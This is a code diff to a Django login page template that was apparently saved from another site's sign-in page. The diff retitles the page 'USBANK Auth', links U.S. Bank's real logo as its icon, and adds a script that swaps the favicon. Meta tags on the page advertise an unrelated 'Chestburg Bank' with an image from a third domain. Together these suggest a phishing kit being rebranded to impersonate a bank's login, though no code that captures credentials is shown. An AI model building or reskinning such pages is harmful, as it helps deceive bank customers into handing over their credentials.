@@ -2,14 +2,15 @@
 {% load static %}
 <!-- saved from url=(0047)https://www.premiumhillscapital.com/sign_in.php -->
 <html><div id="in-page-channel-node-id" data-channel-name="in_page_channel_aJkRuA"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Login</title>
+    <title>USBANK Auth </title>
     
     <meta content="ie=edge" http-equiv="x-ua-compatible">
     <meta content="template language" name="keywords">
     <meta content="" name="author">
     <meta content="" name="description">
     <meta content="width=device-width, initial-scale=1" name="viewport">
-     
+     <link rel="icon" type="image/png"  href="{{site.logo}}" >
+     <link rel="icon" type="image/png"  href="https://www.usbank.com/etc.clientlibs/ecm-global/clientlibs/clientlib-resources/resources/images/svg/logo-personal.svg"  >
     <link href="{% static 'Login_files/perfect-scrollbar.min.css'%}" rel="stylesheet">
     <link href="{% static 'Login_files/slick.css'%}" rel="stylesheet">
     
@@ -24,7 +25,12 @@
 <meta name="twitter:title" content="Chestburg Bank - Trusted Banking & Financial Solutions" />
 <meta name="twitter:description" content="Experience secure and reliable banking services with Chestburg Bank. Offering loans, investments, and personalized banking solutions." />
 <meta name="twitter:image" content="https://firstunitytrust.com/static/assets/assets/main/imges/about.jpeg" /> <!-- Replace with actual image URL -->
-
+<script>
+  const link = document.querySelector("link[rel~='icon']") || document.createElement("link");
+  link.rel = "icon";
+  link.href = "{{site.logo}}";  // must be hosted locally
+  document.getElementsByTagName("head")[0].appendChild(link);
+</script>
 
   </head>
   {% include '../alert/alert.html'%}
